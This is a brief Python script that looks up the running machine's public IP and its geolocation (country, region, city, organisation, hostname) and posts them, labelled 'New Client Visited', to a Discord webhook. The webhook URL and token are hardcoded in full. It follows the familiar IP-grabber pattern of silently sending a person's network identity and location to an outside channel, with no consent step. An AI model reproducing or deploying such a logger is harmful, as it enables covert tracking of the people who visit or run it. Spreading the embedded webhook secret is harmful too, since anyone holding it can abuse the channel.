import requests
import json

# Replace with your Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1211732782821285910/z7DJnn6knSFCCOxnPQ96jYE6uExvP5AH2vrrRd8-ygN876kngvgx2D3mSyYI-LkJwmPy'

# Get the client's IP address (if running on a server, this would be obtained via request headers)
client_ip = requests.get('https://api.ipify.org').text

# Use a third-party service to get location data from the IP (like ipinfo.io)
location_url = f"http://ipinfo.io/{client_ip}/json"
location_data = requests.get(location_url).json()

# Extract the data
country = location_data.get('country', 'Unknown')
region = location_data.get('region', 'Unknown')
city = location_data.get('city', 'Unknown')
org = location_data.get('org', 'Unknown')
hostname = location_data.get('hostname', 'Unknown')

# Create the message to send to Discord
data = {
    "content": "**New Client Visited**",
    "embeds": [
        {
            "title": "Client Information",
            "description": f"IP Address: `{client_ip}`\nCountry: `{country}`\nRegion: `{region}`\nCity: `{city}`\nOrganization: `{org}`\nHostname: `{hostname}`",
            "color": 3447003  # Embed color in hexadecimal
        }
    ]
}

# Send the data to the Discord webhook
response = requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})

if response.status_code == 204:
    print("Webhook sent to Discord!")
else:
    print(f"Failed to send webhook. Status code: {response.status_code}, Response: {response.text}")
